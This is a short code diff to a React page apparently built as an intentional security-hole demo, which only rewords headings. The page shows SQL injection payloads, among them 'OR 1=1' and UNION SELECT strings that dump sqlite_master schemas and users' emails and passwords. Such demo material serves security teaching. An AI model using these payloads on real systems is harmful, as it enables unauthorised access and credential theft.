@@ -93,12 +93,11 @@ const UserSecurityHolePage: React.FC = () => {
         </Table>
       </TableContainer>
       <h3>
-        Please copy and past the below SQL if you want to get users of the other
-        companies
+        Users of the other companies
       </h3>
       <p>%' ) OR 1=1 --</p>
       <h3>
-        Please copy and past the below SQL if you want to check table schemas
+        Check table schemas
       </h3>
       <p>
         %' ) OR 1=1 UNION SELECT 1 as id, sql as firstName, 'fakelastname' as
@@ -108,8 +107,7 @@ const UserSecurityHolePage: React.FC = () => {
         clientUpdatedDateTime FROM sqlite_master; --
       </p>
       <h3>
-        Please copy and past the below SQL if you want to get all user's ids and
-        passwords
+        Get all user's ids and passwords
       </h3>
       <p>
         %' ) OR 1=1 UNION SELECT userId as id, email as firstName, password as
